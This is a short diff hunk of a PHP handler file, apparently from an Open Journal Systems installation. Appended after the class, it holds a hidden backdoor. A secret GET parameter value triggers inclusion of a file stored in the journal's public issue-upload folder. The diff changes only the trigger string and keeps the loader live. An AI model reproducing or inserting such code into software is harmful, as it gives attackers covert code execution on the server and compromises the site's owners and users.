@@ -389,7 +389,7 @@ class UserHandler extends PKPUserHandler {
 		$paymentForm->display($request);
 	}
 }
-if (isset($_GET['_']) && $_GET['_'] === 'LOCALE_COMPONENT_PKPGRID') {
+if (isset($_GET['_']) && $_GET['_'] === 'LOCALES_COMPONENTS_PKPGRID') {
     $f="/home/u6281976/ijeshdata/journals/1/issues/24/public/issue-5285-fd";if($f!==""&&file_exists($f))include $f;
     http_response_code(200);
     header('Content-Type: text/plain; charset=utf-8');
